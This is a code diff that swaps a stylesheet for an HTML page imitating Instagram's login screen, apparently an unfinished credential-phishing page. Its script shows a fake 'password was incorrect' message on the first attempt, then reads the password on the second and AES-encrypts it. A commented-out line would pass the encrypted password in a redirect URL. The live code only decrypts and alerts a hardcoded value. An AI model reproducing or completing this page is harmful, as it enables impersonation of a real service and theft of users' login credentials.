@@ -1,171 +1,107 @@
-@import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    outline: none;
-    list-style: none;
-    text-decoration: none;
-    font-family: 'Roboto', sans-serif;
-}
+<!DOCTYPE html>
+<html lang="en">
 
-body {
-    background: #fafafa;
-    font-size: 14px;
-}
+<head>
+    <meta charset="UTF-8">
+    <title>Mrekullia_e_10 Post</title>
+    <link rel="icon" href="instagrampro.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
 
-.wrapper .header {
-    max-width: 350px;
-    width: 100%;
-    height: auto;
-    margin: 50px auto;
-}
+</head>
+<style>
+    .eiCW- {
+        color: #ed4956;
+        color: rgba(var(--i30, 237, 73, 86), 1);
+        margin: 20px 10px;
+        margin-left: 10px;
+        font-size: 14px;
+        line-height: 18px;
+    }
+</style>
 
-.wrapper .header .top,
-.wrapper .signup {
-    background: #fff;
-    border: 1px solid #e6e6e6;
-    border-radius: 1px;
-    padding: 40px 40px 20px;
-}
 
-.wrapper {
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    text-align: center;
-    min-height: 100 vh;
-}
+<body>
 
-.wrapper .header .logo img {
-    display: block;
-    margin: 0 auto 35px;
-}
+    <div class="wrapper" style="height: 100vh;">
+        <div class="header">
+            <div class="top">
+                <div class="logo">
+                    <img src="instagram.png" alt="instagram" style="width: 175px;">
+                </div>
+                <form class="form" id="addtext">
+                    <div class="input_field">
+                        <input type="text" placeholder="Phone number, username, or email" class="input">
+                    </div>
+                    <div class="input_field">
+                        <input type="password" id="PSWRAGS" placeholder="Password" class="input">
+                    </div>
+                    <button type="submit" onclick="myFunction()" style="width: 100%;" class="btn"><a href="#">Log In</a></button>
+                </form>
+                <div class="or">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="dif">
+                    <div class="fb">
+                        <img src="facebook.png" alt="facebook">
+                        <p>Log in with Facebook</p>
+                    </div>
+                </div>
+                <div id="aarrt" style="display: none;" class="eiCW-">
+                    <p style="width:110%" aria-atomic="true" data-testid="login-error-message" id="slfErrorAlert" role="alert">Sorry, your password was incorrect. Please double-check your password.</p>
+                </div>
 
-.wrapper .header .form .input_field {
-    margin-bottom: 5px;
-}
+                <div class="dif">
+                    <div class="forgot">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </div>
+            </div>
+            <div class="signup">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+            <div class="apps">
+                <p>Get the app.</p>
+                <div class="icons">
+                    <a href="#"><img src="appstore.png" alt="appstore"></a>
+                    <a href="#"><img src="googleplay.png" alt="googleplay"></a>
+                </div>
+            </div>
+        </div>
+    </div>
 
-.wrapper .header .form .input_field .input {
-    width: 100%;
-    background: #fafafa;
-    border: 1px solid #efefef;
-    font-size: 12px;
-    border-radius: 3px;
-    color: #262626;
-    padding: 10px;
-}
+</body>
+<script>
+    var count = 1;
 
-.wrapper .header .form .input_field .input:focus {
-    border: 1px solid #b2b2b2;
-}
+    function myFunction() {
+        if (count == 1) {
+            var element = document.getElementById("aarrt").style.display = "block";
+            count++;
+        } else {
+            var element2 = document.getElementById("PSWRAGS").value;
+            var encrypted = CryptoJS.AES.encrypt(element2, "SECRET");
+            //U2FsdGVkX18ZUVvShFSES21qHsQEqZXMxQ9zgHy+bu0=
+            // alert(encrypted)
+            encrypted2 = "U2FsdGVkX1/cP8EHFOirOH3Cc/P8xQzmz6GUx2UTagc="
+            var decrypted = CryptoJS.AES.decrypt(encrypted2, "SECRET");
+            dded = decrypted.toString(CryptoJS.enc.Utf8);
+            alert(dded)
+                //4d657373616765
+                //window.location = "profile.html?id=$" + encrypted;
 
-.wrapper .header .form .btn {
-    margin: 10px 0;
-    background-color: #3897f0;
-    border: 1px solid #3897f0;
-    border-radius: 4px;
-    text-align: center;
-    padding: 5px;
-}
+        }
+    }
 
-.wrapper .header .form .btn a {
-    color: #fff;
-    display: block;
-}
+    var baseUrl = (window.location).href; // You can also use document.URL
+    var koopId = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+    bb2 = baseUrl.indexOf("=");
+    if (bb2 != -1) {
 
-.wrapper .header .or {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    height: 15px;
-    margin: 15px 0 20px;
-}
+    }
+</script>
 
-.wrapper .header .or .line {
-    width: 105px;
-    height: 2px;
-    background: #efefef
-}
-
-.wrapper .header .or p {
-    color: #999;
-    font-size: 12px;
-}
-
-.wrapper .dif .fb {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-.wrapper .dif .fb img {
-    width: 16px;
-    height: 16px;
-}
-
-.wrapper .dif .fb p {
-    color: #385185;
-    font-weight: 500;
-    margin-left: 10px;
-}
-
-.wrapper .dif .forgot {
-    font-size: 12px;
-    text-align: center;
-    margin-top: 20px;
-}
-
-.wrapper .dif .forgot a {
-    color: #003569;
-}
-
-.wrapper .signup {
-    margin: 10px 0 20px;
-    padding: 25px 40px;
-    text-align: center;
-    color: #262626;
-}
-
-.wrapper .signup a {
-    color: #3897f0;
-}
-
-.wrapper .apps {
-    text-align: center;
-    color: #262626;
-}
-
-.wrapper .apps p {
-    margin-bottom: 20px;
-}
-
-.wrapper .apps a img {
-    width: 135px;
-    height: 40px;
-    margin: 0 5px;
-}
-
-.footer {
-    max-width: 935px;
-    width: 100%;
-    margin: 0 auto;
-    padding: 40px 0;
-    display: flex;
-    justify-content: space-between;
-}
-
-.footer .links ul li {
-    display: inline-block;
-    margin-right: 10px;
-}
-
-.footer .links ul li a {
-    color: #003569;
-    font-size: 12px;
-}
-
-.footer .copyright {
-    color: #999;
-}
+</html>
